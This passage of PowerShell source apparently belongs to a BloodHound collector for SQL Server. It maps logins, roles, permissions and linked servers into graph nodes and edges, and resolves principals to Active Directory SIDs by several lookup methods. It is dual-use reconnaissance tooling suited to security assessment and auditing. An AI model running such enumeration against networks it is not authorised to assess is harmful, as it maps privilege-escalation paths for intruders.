            $isNewIP = $NewProperties[$key] -match '^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$'
            
            # Only update if existing is IP and new is not
            if ($isExistingIP -and -not $isNewIP) {
                $propsObj.$key = $NewProperties[$key]
            }
      
        # For linkedFromServers, append to existing array
        } elseif ($key -eq "hasLinksFromServers") {
            if ($propsObj.$key) {
                # Add new servers to existing array, avoiding duplicates
                $existingServers = @($propsObj.$key)
                $newServers = @($NewProperties[$key])
                $propsObj.$key = @($existingServers + $newServers | Select-Object -Unique)
            } else {
                $propsObj.$key = $NewProperties[$key]
            }
        } else {
            # For all other properties, just merge
            $propsObj.$key = $NewProperties[$key]
        }
    }
    
    return $true
}

function Add-Edge {
    param(
        [string]$Source = $null,
        [string]$Kind,
        [string]$Target = $null,
        [hashtable]$Properties = @{},
        [bool]$UseDefaultProperties = $true
    )

    # Check if edge is non-traversable based on its properties
    if (-not $script:IncludeNontraversableEdges) {
        if ($script:EdgePropertyGenerators.ContainsKey($Kind)) {
            $tempProps = & $script:EdgePropertyGenerators[$Kind] $script:CurrentEdgeContext
            if ($tempProps -and $tempProps.ContainsKey("traversable") -and $tempProps.traversable -eq $false) {
                return
            }
        }
    }

    # Get from context if not provided
    if (-not $Source -and $script:CurrentEdgeContext.principal) {
        $Source = $script:CurrentEdgeContext.principal.ObjectIdentifier
    }
    if (-not $Target -and $script:CurrentEdgeContext.targetPrincipal) {
        $Target = $script:CurrentEdgeContext.targetPrincipal.ObjectIdentifier
    }

    $missingProperties = @()
        
    # Check required properties
    if (-not $script:CurrentEdgeContext.principal) {
        $missingProperties += "principal"
    }
    if (-not $script:CurrentEdgeContext.principalNodeType) {
        $missingProperties += "principalNodeType"
    }
    if (-not $script:CurrentEdgeContext.targetPrincipal) {
        $missingProperties += "targetPrincipal"
    }
    if (-not $script:CurrentEdgeContext.targetPrincipalNodeType) {
        $missingProperties += "targetPrincipalNodeType"
    }
    
    # Report missing properties
    if ($missingProperties.Count -gt 0) {
        Write-Warning "Missing CurrentEdgeContext properties for edge type '$Kind': $($missingProperties -join ', ')"
        Write-Warning "Source: $Source, Target: $Target"
        Write-Debug "Current Context: $($script:CurrentEdgeContext | ConvertTo-Json -Depth 2)"
    }  
    
    # Determine WithGrant value from context
    $WithGrant = if ($script:CurrentEdgeContext.perm) { 
        $script:CurrentEdgeContext.perm.State -eq "GRANT_WITH_GRANT_OPTION" 
    } else { 
        $false 
    }
    
    # Build final properties by merging defaults and custom
    $finalProperties = @{}
    
    # Add WithGrant if true
    if ($WithGrant) {
        $finalProperties.withGrant = $true
    }
    
    # Generate default properties if available
    if ($UseDefaultProperties -and $script:EdgePropertyGenerators.ContainsKey($Kind)) {
        $generatedProps = & $script:EdgePropertyGenerators[$Kind] $script:CurrentEdgeContext
        foreach ($key in $generatedProps.Keys) {
            $value = $generatedProps[$key]
            # Only add non-null, non-empty properties (but allow boolean false)
            if ($null -ne $value -and ($value -ne "" -or $value -is [bool]) -and ($value -ne @{} -or $value -is [bool])) {
                # Ensure value is a primitive type (string, number, boolean) or array of primitives
                if ($value -is [hashtable] -or $value -is [PSCustomObject]) {
                    # Skip complex objects
                    continue
                }
                $finalProperties[$key] = $value
            }
        }
    }
    
    # Merge in any additional properties passed to the function
    foreach ($key in $Properties.Keys) {
        $finalProperties[$key] = $Properties[$key]
    }
    
    if ($script:OutputFormat -eq "BloodHound") {
        $edge = @{
            start = @{ value = $Source }
            end = @{ value = $Target }
            kind = $Kind
        }
        
        # Only add properties if there are any
        if ($finalProperties.Count -gt 0) {
            $edge.properties = $finalProperties
        }
        $script:bloodhoundOutput.graph.edges += $edge
        Write-Verbose "Server edge count: $(@($script:bloodhoundOutput.graph.edges).Count)"
    }

    elseif ($script:OutputFormat -eq "BHGeneric") {
        $edge = [PSCustomObject]@{
            source = $Source
            target = $Target
            kind = $Kind
        }
        
        # Add all final properties to the edge object (including withGrant)
        foreach ($key in $finalProperties.Keys) {
            $edge | Add-Member -MemberType NoteProperty -name $key -value $finalProperties[$key] -force -ea 0
        }

        $script:edgesOutput += $edge | ToBHGenericEdge * -ExcludeProps source,kind,target
    }
}

# Helper function to add nodes based on output format
function Add-Node {
    param(
        [string]$Id,
        [string[]]$Kinds,
        [hashtable]$Properties,
        [hashtable]$Icon = $null
    )
    
    if ($script:OutputFormat -eq "BloodHound" -or $script:OutputFormat -eq "BHGeneric") {
        # Check if node already exists and merge properties if it does
        if (Merge-NodeIfExists -Id $Id -NewProperties $Properties) {
            return  # Node already exists and properties were merged
        }

        if ($script:OutputFormat -eq "BloodHound") {
            # Filter out null properties for BloodHound
            $cleanProperties = @{}
            foreach ($key in $Properties.Keys) {
                if ($null -ne $Properties[$key]) {
                    $cleanProperties[$key] = $Properties[$key]
                }
            }

            $node = @{
                id = $Id
                kinds = $Kinds
                properties = $cleanProperties
            }
            $script:bloodhoundOutput.graph.nodes += $node
            Write-Verbose "Server node count: $(@($script:bloodhoundOutput.graph.nodes).Count)"

        } elseif ($script:OutputFormat -eq "BHGeneric") {           
            $node = [PSCustomObject]@{
                id = $Id
                name = $Properties.name
            }
            # Filter out null properties for BloodHound
            foreach ($key in $cleanProperties.Keys) {
                if ($null -ne $cleanProperties[$key]) {
                    $node | Add-Member -MemberType NoteProperty -name $key -value $cleanProperties.$key -force -ea 0
                }
            }
            $script:nodesOutput += $node | ToBHGenericNode -NodeType $Kinds[0]
        }
    }
}

# Helper function to map SQL types to BloodHound kinds
function Get-BloodHoundKinds {
    param($typeDescription, $isFixedRole, $context = "Server")
    
    # For database context, return database-specific kinds
    if ($context -eq "Database") {
        $kinds = switch ($typeDescription) {
            "DATABASE_ROLE" { @("MSSQL_DatabaseRole") }
            "WINDOWS_USER" { @("MSSQL_DatabaseUser") }
            "WINDOWS_GROUP" { @("MSSQL_DatabaseUser") }
            "SQL_USER" { @("MSSQL_DatabaseUser") }
            "ASYMMETRIC_KEY_MAPPED_USER" { @("MSSQL_DatabaseUser") }
            "CERTIFICATE_MAPPED_USER" { @("MSSQL_DatabaseUser") }
            "APPLICATION_ROLE" { @("MSSQL_ApplicationRole") }
            default { 
                $null  # Return null instead of creating unknown nodes
            }        
        }
    }
    else {
        # Server context
        $kinds = switch ($typeDescription) {
            "SERVER_ROLE" { @("MSSQL_ServerRole") }
            "WINDOWS_LOGIN" { @("MSSQL_Login") }
            "WINDOWS_GROUP" { @("MSSQL_Login") }
            "SQL_LOGIN" { @("MSSQL_Login") }
            "ASYMMETRIC_KEY_MAPPED_LOGIN" { @("MSSQL_Login") }
            "CERTIFICATE_MAPPED_LOGIN" { @("MSSQL_Login") }
            default { 
                $null  # Return null instead of creating unknown nodes
            }
        }
    }
    
    return $kinds
}

# Helper function to resolve DataSource to hostname and SID
function Resolve-DataSourceToSid {
    param (
        [string]$DataSource
    )
    
    try {
        # Parse DataSource for hostname and port
        $hostname = $null
        $port = "1433"  # Default SQL port
        $instanceName = $null
        
        # Handle different formats: hostname, hostname:port, hostname\instance, hostname,port
        if ($DataSource -match '^([^\\,:]+)(\\([^,:]+))?([,:](\d+))?$') {
            $hostname = $matches[1]
            if ($matches[3]) { $instanceName = $matches[3] }
            if ($matches[5]) { $port = $matches[5] }
        } else {
            $hostname = $DataSource
        }
        
        # If hostname is an IP address, resolve to hostname
        if ($hostname -match '^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$') {
            try {
                $hostEntry = [System.Net.Dns]::GetHostEntry($hostname)
                $hostname = $hostEntry.HostName.Split('.')[0]  # Get just the hostname part
            }
            catch {
                Write-Verbose "Unable to resolve IP $hostname to hostname"
                return $null
            }
        }
        
        # Get computer SID
        $computer = Resolve-DomainPrincipal $hostname
        if ($computer.SID) {
            $computerSid = $computer.SID
            # Create objectIdentifier with SID and port/instance
            if ($instanceName) {
                return "$computerSid`:$instanceName"
            } else {
                return "$computerSid`:$port"
            }
        } else {
            # If can't get SID, fall back to hostname-based identifier
            if ($instanceName) {
                return "$hostname`:$instanceName"
            } else {
                return "$hostname`:$port"
            }
        }
    }
    catch {
        Write-Verbose "Error resolving DataSource '$DataSource': $_"
        return $null
    }
}

function Test-PrivateIPAddress {
    param([string]$IPAddress)
    
    try {
        $ip = [System.Net.IPAddress]::Parse($IPAddress)
        $bytes = $ip.GetAddressBytes()
        
        # Check for private IP ranges (RFC 1918)
        if ($bytes[0] -eq 10) {
            return $true  # 10.0.0.0/8
        }
        if ($bytes[0] -eq 172 -and $bytes[1] -ge 16 -and $bytes[1] -le 31) {
            return $true  # 172.16.0.0/12
        }
        if ($bytes[0] -eq 192 -and $bytes[1] -eq 168) {
            return $true  # 192.168.0.0/16
        }
        
        # Check for other internal ranges
        if ($bytes[0] -eq 127) {
            return $true  # 127.0.0.0/8 (loopback)
        }
        if ($bytes[0] -eq 169 -and $bytes[1] -eq 254) {
            return $true  # 169.254.0.0/16 (link-local)
        }
        
        # Check for IPv6 private ranges
        if ($ip.AddressFamily -eq [System.Net.Sockets.AddressFamily]::InterNetworkV6) {
            $ipv6String = $ip.ToString().ToLower()
            if ($ipv6String.StartsWith("fc") -or $ipv6String.StartsWith("fd")) {
                return $true  # fc00::/7 (unique local)
            }
            if ($ipv6String.StartsWith("fe8") -or $ipv6String.StartsWith("fe9") -or 
                $ipv6String.StartsWith("fea") -or $ipv6String.StartsWith("feb")) {
                return $true  # fe80::/10 (link-local)
            }
            if ($ipv6String -eq "::1") {
                return $true  # loopback
            }
        }
        
        return $false
    } catch {
        return $false
    }
}

function Test-DomainResolution {
    param([string]$Domain)
    
    if (-not $Domain) {
        return $false
    }
    
    $domainLower = $Domain.ToLower()
    
    # Check cache first
    if ($script:DomainResolutionCache.ContainsKey($domainLower)) {
        $cachedResult = $script:DomainResolutionCache[$domainLower]
        Write-Verbose "Using cached domain resolution for '$Domain': $($cachedResult.IsValid)"
        return $cachedResult.IsValid
    }
    
    Write-Verbose "Testing domain resolution for: $Domain"
    
    try {
        # Try to resolve the domain
        $dnsResult = [System.Net.Dns]::GetHostAddresses($Domain)
        
        if ($dnsResult -and $dnsResult.Count -gt 0) {
            $privateIPs = @()
            $publicIPs = @()
            
            # Categorize IPs
            foreach ($ip in $dnsResult) {
                if (Test-PrivateIPAddress -IPAddress $ip.ToString()) {
                    $privateIPs += $ip.ToString()
                } else {
                    $publicIPs += $ip.ToString()
                }
            }
            
            $isValid = $privateIPs.Count -gt 0
            
            # Cache the result
            $script:DomainResolutionCache[$domainLower] = @{
                IsValid = $isValid
                PrivateIPs = $privateIPs
                PublicIPs = $publicIPs
                LastChecked = Get-Date
            }
            
            if ($isValid) {
                Write-Verbose "Domain '$Domain' resolves to private IP(s): $($privateIPs -join ', ')"
            } else {
                Write-Verbose "Domain '$Domain' resolves to public IP(s): $($publicIPs -join ', ') - skipping"
            }
            
            return $isValid
        }
    } catch {
        Write-Verbose "Failed to resolve domain '$Domain': $_"
        
        # Special handling for common internal domain patterns
        $isInternalPattern = ($Domain -match "\.local$" -or $Domain -match "\.lan$" -or 
                            $Domain -match "\.internal$" -or $Domain -match "\.corp$" -or
                            $Domain -match "\.ad$" -or $Domain -notmatch "\.")
        
        # Cache the result
        $script:DomainResolutionCache[$domainLower] = @{
            IsValid = $isInternalPattern
            PrivateIPs = @()
            PublicIPs = @()
            LastChecked = Get-Date
            ResolutionFailed = $true
            InternalPattern = $isInternalPattern
        }
        
        if ($isInternalPattern) {
            Write-Verbose "Domain '$Domain' appears to be internal despite resolution failure - allowing"
        }
        
        return $isInternalPattern
    }
}

function Test-DomainAccessibility {
    param(
        [string]$Domain,
        [int]$TimeoutSeconds = 5
    )
    
    if (-not $Domain) {
        return $false
    }
    
    # Check cache first
    $cacheKey = "domain_test_$($Domain.ToLower())"
    if ($script:DomainTestCache -and $script:DomainTestCache.ContainsKey($cacheKey)) {
        $cached = $script:DomainTestCache[$cacheKey]
        # Use cached result if less than 10 minutes old
        if (((Get-Date) - $cached.TestTime).TotalMinutes -lt 10) {
            Write-Verbose "Using cached accessibility test for '$Domain': $($cached.IsAccessible)"
            return $cached.IsAccessible
        }
    }
    
    Write-Verbose "Testing domain accessibility: $Domain"
    
    # Initialize cache if needed
    if (-not $script:DomainTestCache) {
        $script:DomainTestCache = @{}
    }
    
    $isAccessible = $false
    
    try {
        # Quick test using PowerShell job with timeout
        $job = Start-Job -ScriptBlock {
            param($Domain)
            try {
                # Try a simple AD operation that should work if the domain is accessible
                if (Get-Command -Name Get-ADDomain -ErrorAction SilentlyContinue) {
                    # Test by trying to get basic domain info
                    $null = Get-ADDomain -Identity $Domain -ErrorAction Stop
                    return $true
                } else {
                    # Fallback: try DNS resolution
                    $null = [System.Net.Dns]::GetHostAddresses($Domain)
                    return $true
                }
            } catch {
                return $false
            }
        } -ArgumentList $Domain
        
        $completed = Wait-Job -Job $job -Timeout $TimeoutSeconds
        
        if ($completed) {
            $result = Receive-Job -Job $job
            $isAccessible = $result -eq $true
        } else {
            Write-Verbose "Domain accessibility test timed out for '$Domain'"
            Stop-Job -Job $job
        }
        
        Remove-Job -Job $job -Force
        
    } catch {
        Write-Verbose "Domain accessibility test failed for '$Domain': $_"
        $isAccessible = $false
    }
    
    # Cache the result
    $script:DomainTestCache[$cacheKey] = @{
        IsAccessible = $isAccessible
        TestTime = Get-Date
    }
    
    Write-Verbose "Domain '$Domain' accessibility: $isAccessible"
    return $isAccessible
}

function Get-DomainsToTry {
    param (
        [string]$PrincipalName,
        [string[]]$AlternativeDomains = @()
    )
    
    # Check if we've already processed this exact principal name
    $cacheKey = "$PrincipalName|$($AlternativeDomains -join ',')"
    if ($script:ValidatedDomainsCache.ContainsKey($cacheKey)) {
        $cachedResult = $script:ValidatedDomainsCache[$cacheKey]
        Write-Verbose "Using cached domain list for '$PrincipalName': $($cachedResult -join ', ')"
        return $cachedResult
    }
    
    # Common TLDs that should not be used as domain names
    $commonTLDs = @(
        'com', 'org', 'net', 'edu', 'gov', 'mil', 'int', 'arpa',
        'local', 'lan', 'intranet', 'internal', 'corp', 'domain',
        'ad', 'ds', 'forest', 'root', 'test', 'example', 'localhost'
    )
    
    $domainsToTry = @()
    
    # Add script domain if available
    if ($script:Domain) {
        $domainsToTry += $script:Domain
    }
    
    # Add alternative domains from parameter
    if ($AlternativeDomains) {
        $domainsToTry += $AlternativeDomains
    }
    
    # Parse principal name and extract domain information
    $extractedDomain = $null
    
    if ($PrincipalName -match "\\") {
        # DOMAIN\name format
        $domainAndName = $PrincipalName.Split('\')
        $extractedDomain = $domainAndName[0]
        $domainsToTry += $extractedDomain
    } elseif ($PrincipalName -match "@") {
        # name@domain.com format
        $domainAndName = $PrincipalName.Split('@')
        $extractedDomain = $domainAndName[1]
        $domainsToTry += $extractedDomain
        
        # Add subdomains and root domain for FQDN
        if ($extractedDomain -match "\.") {
            $domainParts = $extractedDomain.Split('.')
            
            # Add each subdomain level (e.g., for "sub.contoso.com" add "contoso.com")
            # But stop before we get to single TLD parts
            for ($i = 1; $i -lt $domainParts.Length - 1; $i++) {
                $parentDomain = $domainParts[$i..($domainParts.Length - 1)] -join '.'
                # Only add if it contains at least one dot (i.e., not just a TLD)
                if ($parentDomain -match "\." -and $parentDomain.Split('.').Length -ge 2) {
                    $domainsToTry += $parentDomain
                }
            }
        }
    } elseif ($PrincipalName -match "\.") {
        # computer.domain.com format - extract hostname and domain
        $parts = $PrincipalName.Split('.')
        
        if ($parts.Length -gt 1) {
            $extractedDomain = $parts[1..($parts.Length - 1)] -join '.'
            # Only add if it's a proper domain (has at least one dot)
            if ($extractedDomain -match "\." -and $extractedDomain.Split('.').Length -ge 2) {
                $domainsToTry += $extractedDomain
            }
            
            # Add subdomains and root domain
            $domainParts = $extractedDomain.Split('.')
            # Stop before single TLD parts
            for ($i = 1; $i -lt $domainParts.Length - 1; $i++) {
                $parentDomain = $domainParts[$i..($domainParts.Length - 1)] -join '.'
                # Only add if it contains at least one dot
                if ($parentDomain -match "\." -and $parentDomain.Split('.').Length -ge 2) {
                    $domainsToTry += $parentDomain
                }
            }
        }
    }
    
    # Add common environment domains
    if ($env:USERDNSDOMAIN) {
        $domainsToTry += $env:USERDNSDOMAIN
        
        # Add parent domains of USERDNSDOMAIN
        if ($env:USERDNSDOMAIN -match "\.") {
            $envDomainParts = $env:USERDNSDOMAIN.Split('.')
            # Stop before single TLD parts
            for ($i = 1; $i -lt $envDomainParts.Length - 1; $i++) {
                $parentDomain = $envDomainParts[$i..($envDomainParts.Length - 1)] -join '.'
                # Only add if it contains at least one dot
                if ($parentDomain -match "\." -and $parentDomain.Split('.').Length -ge 2) {
                    $domainsToTry += $parentDomain
                }
            }
        }
    }
    
    if ($env:USERDOMAIN) {
        $domainsToTry += $env:USERDOMAIN
    }
    
    # Get current domain from computer if domain-joined (cache this too)
    if (-not $script:ComputerDomainCache) {
        try {
            $computerSystem = Get-CimInstance -Class Win32_ComputerSystem -ErrorAction SilentlyContinue
            if ($computerSystem -and $computerSystem.Domain -and $computerSystem.Domain -ne "WORKGROUP") {
                $script:ComputerDomainCache = $computerSystem.Domain
            } else {
                $script:ComputerDomainCache = $null
            }
        } catch {
            Write-Verbose "Could not retrieve domain from Win32_ComputerSystem: $_"
            $script:ComputerDomainCache = $null
        }
    }
    
    if ($script:ComputerDomainCache) {
        $domainsToTry += $script:ComputerDomainCache
        
        # Add parent domains
        if ($script:ComputerDomainCache -match "\.") {
            $wmiDomainParts = $script:ComputerDomainCache.Split('.')
            # Stop before single TLD parts
            for ($i = 1; $i -lt $wmiDomainParts.Length - 1; $i++) {
                $parentDomain = $wmiDomainParts[$i..($wmiDomainParts.Length - 1)] -join '.'
                # Only add if it contains at least one dot
                if ($parentDomain -match "\." -and $parentDomain.Split('.').Length -ge 2) {
                    $domainsToTry += $parentDomain
                }
            }
        }
    }
    
    # Process and validate domains efficiently
    $uniqueDomains = @()
    $seenDomains = @{}
    
    foreach ($domain in $domainsToTry) {
        $cleanDomain = $domain.Trim()
        $domainLower = $cleanDomain.ToLower()
        
        # Skip if empty or already processed
        if (-not $cleanDomain -or $seenDomains.ContainsKey($domainLower)) {
            continue
        }
        
        # Check validation cache first
        if ($script:DomainValidationCache.ContainsKey($domainLower)) {
            $cachedValidation = $script:DomainValidationCache[$domainLower]
            Write-Verbose "Using cached validation for domain '$cleanDomain': $($cachedValidation.IsValid)"
            if ($cachedValidation.IsValid) {
                $uniqueDomains += $cleanDomain
            }
            $seenDomains[$domainLower] = $true
            continue
        }
        
        # Perform validation logic
        $isValid = $false
        $skipReason = ""
        
        # Skip if it's just a TLD
        if ($commonTLDs -contains $domainLower) {
            $skipReason = "TLD-only domain"
        }
        # Skip if it's a single part that looks like a TLD
        elseif ($cleanDomain -notmatch "\." -and $cleanDomain.Length -le 4) {
            $skipReason = "potential TLD"
        }
        else {
            # Additional validation
            $domainParts = $cleanDomain.Split('.')
            if ($domainParts.Length -eq 1) {
                # Single part domains
                if ($cleanDomain.Length -gt 4 -or $cleanDomain -match "^[A-Z0-9-]+$") {
                    # Test domain resolution
                    if (Test-DomainResolution -Domain $cleanDomain) {
                        $isValid = $true
                    } else {
                        $skipReason = "doesn't resolve to private IP"
                    }
                } else {
                    $skipReason = "likely TLD single-part domain"
                }
            } elseif ($domainParts.Length -ge 2) {
                # Multi-part domains
                $lastPart = $domainParts[-1].ToLower()
                
                if ($lastPart.Length -le 6) {
                    # Test domain resolution
                    if (Test-DomainResolution -Domain $cleanDomain) {
                        $isValid = $true
                    } else {
                        $skipReason = "doesn't resolve to private IP"
                    }
                } else {
                    $skipReason = "suspicious TLD"
                }
            }
        }
        
        # Cache the validation result
        $script:DomainValidationCache[$domainLower] = @{
            IsValid = $isValid
            SkipReason = $skipReason
            LastChecked = Get-Date
        }
        
        if ($isValid) {
            $uniqueDomains += $cleanDomain
        } else {
            Write-Verbose "Skipping domain '$cleanDomain': $skipReason"
        }
        
        $seenDomains[$domainLower] = $true
    }
    
    # Test each domain for accessibility before returning
    $accessibleDomains = @()
    
    foreach ($domain in $uniqueDomains) {
        if (Test-DomainAccessibility -Domain $domain) {
            $accessibleDomains += $domain
        } else {
            Write-Verbose "Skipping inaccessible domain: $domain"
        }
    }
    
    Write-Verbose "Accessible domains for '$PrincipalName': $($accessibleDomains -join ', ')"

    # Cache the final result
    $script:ValidatedDomainsCache[$cacheKey] = $accessibleDomains

    return $accessibleDomains
}

function Resolve-PrincipalInDomain {
    param (
        [string]$Name,
        [string]$Domain
    )
    
    Write-Verbose "Attempting to resolve '$Name' in domain '$Domain'"
    
    $adPowershellSucceeded = $false
    
    # Try Active Directory PowerShell module first
    if (Get-Command -Name Get-ADComputer -ErrorAction SilentlyContinue) {
        Write-Verbose "Trying AD PowerShell module in domain: $Domain"
        
        try {
            $adObject = $null
            
            # Set server parameter if domain is specified and different from current
            $adParams = @{ Identity = $Name }
            if ($Domain -and $Domain -ne $env:USERDOMAIN -and $Domain -ne $env:USERDNSDOMAIN) {
                $adParams.Server = $Domain
            }
            
            # Try Computer first
            try {
                $adObject = Get-ADComputer @adParams -ErrorAction Stop
            } catch {
                # Try Computer by SID
                try {
                    $adParams.Remove('Identity')
                    $adParams.LDAPFilter = "(objectSid=$Name)"
                    $adObject = Get-ADComputer @adParams -ErrorAction Stop
                    if (-not $adObject) { throw }
                } catch {
                    # Try User
                    try {
                        $adParams.Remove('LDAPFilter')
                        $adParams.Identity = $Name
                        $adObject = Get-ADUser @adParams -ErrorAction Stop
                    } catch {
                        # Try User by SID
                        try {
                            $adParams.Remove('Identity')
                            $adParams.LDAPFilter = "(objectSid=$Name)"
                            $adObject = Get-ADUser @adParams -ErrorAction Stop
                            if (-not $adObject) { throw }
                        } catch {
                            # Try Group
                            try {
                                $adParams.Remove('LDAPFilter')
                                $adParams.Identity = $Name
                                $adObject = Get-ADGroup @adParams -ErrorAction Stop
                            } catch {
                                # Try Group by SID
                                try {
                                    $adParams.Remove('Identity')
                                    $adParams.LDAPFilter = "(objectSid=$Name)"
                                    $adObject = Get-ADGroup @adParams -ErrorAction Stop
                                    if (-not $adObject) { throw }
                                } catch {
                                    Write-Verbose "No AD object found for '$Name' in domain '$Domain'"
                                }
                            }
                        }
                    }
                }
            }
            
            if ($adObject) {
                $adObjectName = if ($adObject.UserPrincipalName) { $adObject.UserPrincipalName } elseif ($adObject.DNSHostName) { $adObject.DNSHostName } else { $adObject.SamAccountName }
                $adObjectSid = $adObject.SID.ToString()
                Write-Verbose "Resolved '$Name' to AD principal in '$Domain': $adObjectName ($adObjectSid)"
                
                # Upper the first letter of object class to match BloodHound kind
                $kind = if ($adObject.ObjectClass -and $adObject.ObjectClass.Length -gt 0) { 
                    $adObject.ObjectClass.Substring(0,1).ToUpper() + $adObject.ObjectClass.Substring(1).ToLower() 
                } else { 
                    $adObject.ObjectClass 
                }
                
                $adPowershellSucceeded = $true
                return [PSCustomObject]@{
                    ObjectIdentifier = $adObjectSid
                    Name = $adObjectName
                    DistinguishedName = $adObject.DistinguishedName
                    DNSHostName = $adObject.DNSHostName
                    Domain = $Domain
                    Enabled = $adObject.Enabled
                    IsDomainPrincipal = $true
                    SamAccountName = $adObject.SamAccountName
                    SID = $adObject.SID.ToString()
                    UserPrincipalName = $adObject.UserPrincipalName
                    Type = $kind
                    Error = $null
                }
            }
        } catch {
            Write-Verbose "AD PowerShell lookup failed for '$Name' in domain '$Domain': $_"
        }
    }
    
    # Try .NET DirectoryServices AccountManagement
    if ($script:UseNetFallback -or -not (Get-Command -Name Get-ADComputer -ErrorAction SilentlyContinue) -or -not $adPowershellSucceeded) {
        Write-Verbose "Attempting .NET DirectoryServices AccountManagement for '$Name' in domain '$Domain'"
        
        try {
            # Load assemblies - these must succeed for .NET approach to work
            Add-Type -AssemblyName System.DirectoryServices.AccountManagement -ErrorAction Stop
            Add-Type -AssemblyName System.DirectoryServices -ErrorAction Stop
            
            # Try AccountManagement approach
            $context = New-Object System.DirectoryServices.AccountManagement.PrincipalContext([System.DirectoryServices.AccountManagement.ContextType]::Domain, $Domain)
            $principal = $null
            
            # Try as Computer
            try {
                $principal = [System.DirectoryServices.AccountManagement.ComputerPrincipal]::FindByIdentity($context, $Name)
                if ($principal) {
                    Write-Verbose "Found computer principal using .NET DirectoryServices: $($principal.Name)"
                }
            } catch {
                Write-Verbose "Computer lookup failed: $_"
            }
            
            # Try as User if computer lookup failed
            if (-not $principal) {
                try {
                    $principal = [System.DirectoryServices.AccountManagement.UserPrincipal]::FindByIdentity($context, $Name)
                    if ($principal) {
                        Write-Verbose "Found user principal using .NET DirectoryServices: $($principal.Name)"
                    }
                } catch {
                    Write-Verbose "User lookup failed: $_"
                }
            }
            
            # Try as Group if user lookup failed
            if (-not $principal) {
                try {
                    $principal = [System.DirectoryServices.AccountManagement.GroupPrincipal]::FindByIdentity($context, $Name)
                    if ($principal) {
                        Write-Verbose "Found group principal using .NET DirectoryServices: $($principal.Name)"
                    }
                } catch {
                    Write-Verbose "Group lookup failed: $_"
                }
            }
            
            if ($principal) {
                $principalType = $principal.GetType().Name -replace "Principal$", ""
                
                $result = [PSCustomObject]@{
                    ObjectIdentifier = $principal.Sid.Value
                    Name = if ($principal.UserPrincipalName) { $principal.UserPrincipalName } else { $principal.SamAccountName }
                    DistinguishedName = $principal.DistinguishedName
                    DNSHostName = if ($principal.GetType().Name -eq "ComputerPrincipal") { $principal.Name } else { $null }
                    Domain = $Domain
                    Enabled = if ($principal.PSObject.Properties['Enabled']) { $principal.Enabled } else { $null }
                    IsDomainPrincipal = $true
                    SamAccountName = $principal.SamAccountName
                    SID = $principal.Sid.Value
                    UserPrincipalName = $principal.UserPrincipalName
                    Type = $principalType
                    Error = $null
                }
                
                $context.Dispose()
                return $result
            }
            
            $context.Dispose()
            
        } catch {
            Write-Verbose "Failed .NET DirectoryServices AccountManagement for '$Name' in domain '$Domain': $_"
        }
        
        # Try ADSISearcher approach
        try {
            Write-Verbose "Attempting ADSISearcher for '$Name' in domain '$Domain'"
            
            # Build LDAP path
            $domainDN = if ($Domain) {
                "DC=" + ($Domain -replace "\.", ",DC=")
            } else {
                $null
            }
            
            # Create ADSISearcher
            $adsiSearcher = if ($domainDN) {
                [ADSISearcher]"LDAP://$domainDN"
            } else {
                [ADSISearcher]""
            }
            
            # Try different search filters
            $searchFilters = @(
                "(samAccountName=$Name)",
                "(objectSid=$Name)",
                "(userPrincipalName=$Name)",
                "(dnsHostName=$Name)",
                "(cn=$Name)"
            )
            
            $adsiResult = $null
            foreach ($filter in $searchFilters) {
                try {
                    $adsiSearcher.Filter = $filter
                    $adsiResult = $adsiSearcher.FindOne()
                    if ($adsiResult) {
                        Write-Verbose "Found object using ADSISearcher with filter: $filter"
                        break
                    }
                } catch {
                    Write-Verbose "ADSISearcher filter '$filter' failed: $_"
                }
            }
            
            if ($adsiResult) {
                $props = $adsiResult.Properties
                $objectClass = if ($props["objectclass"]) { $props["objectclass"][$props["objectclass"].Count - 1] } else { "unknown" }
                $objectSid = if ($props["objectsid"]) { 
                    (New-Object System.Security.Principal.SecurityIdentifier($props["objectsid"][0], 0)).Value 
                } else { 
                    $null 
                }
                
                Write-Verbose "Found object using ADSISearcher: $($props["samaccountname"][0])"
                
                $result = [PSCustomObject]@{
                    ObjectIdentifier = $objectSid
                    Name = if ($props["userprincipalname"]) { $props["userprincipalname"][0] } elseif ($props["dnshostname"]) { $props["dnshostname"][0] } else { $props["samaccountname"][0] }
                    DistinguishedName = if ($props["distinguishedname"]) { $props["distinguishedname"][0] } else { $null }
                    DNSHostName = if ($props["dnshostname"]) { $props["dnshostname"][0] } else { $null }
                    Domain = $Domain
                    Enabled = if ($props["useraccountcontrol"]) { 
                        -not ([int]$props["useraccountcontrol"][0] -band 2) 
                    } else { 
                        $null 
                    }
                    IsDomainPrincipal = $true
                    SamAccountName = if ($props["samaccountname"]) { $props["samaccountname"][0] } else { $null }
                    SID = $objectSid
                    UserPrincipalName = if ($props["userprincipalname"]) { $props["userprincipalname"][0] } else { $null }
                    Type = if ($objectClass -and $objectClass.Length -gt 0) { 
                        $objectClass.Substring(0,1).ToUpper() + $objectClass.Substring(1).ToLower() 
                    } else { 
                        "Unknown" 
                    }
                    Error = $null
                }
                
                $adsiSearcher.Dispose()
                return $result
            }
            
            $adsiSearcher.Dispose()
            
        } catch {
            Write-Verbose "ADSISearcher lookup failed for '$Name' in domain '$Domain': $_"
        }
        
        # Try DirectorySearcher as final .NET attempt
        try {
            Write-Verbose "Attempting DirectorySearcher for '$Name' in domain '$Domain'"
            
            Add-Type -AssemblyName System.DirectoryServices -ErrorAction Stop
            
            $searcher = New-Object System.DirectoryServices.DirectorySearcher
            $searcher.Filter = "(|(samAccountName=$Name)(objectSid=$Name)(userPrincipalName=$Name)(dnsHostName=$Name))"
            $null = $searcher.PropertiesToLoad.Add("samAccountName")
            $null = $searcher.PropertiesToLoad.Add("objectSid")
            $null = $searcher.PropertiesToLoad.Add("distinguishedName")
            $null = $searcher.PropertiesToLoad.Add("userPrincipalName")
            $null = $searcher.PropertiesToLoad.Add("dnsHostName")
            $null = $searcher.PropertiesToLoad.Add("objectClass")
            $null = $searcher.PropertiesToLoad.Add("userAccountControl")
            
            $result = $searcher.FindOne()
            if ($result) {
                $objectClass = $result.Properties["objectclass"][$result.Properties["objectclass"].Count - 1]
                $objectSid = (New-Object System.Security.Principal.SecurityIdentifier($result.Properties["objectsid"][0], 0)).Value
                
                Write-Verbose "Found object using DirectorySearcher: $($result.Properties["samaccountname"][0])"
                
                $returnResult = [PSCustomObject]@{
                    ObjectIdentifier = $objectSid
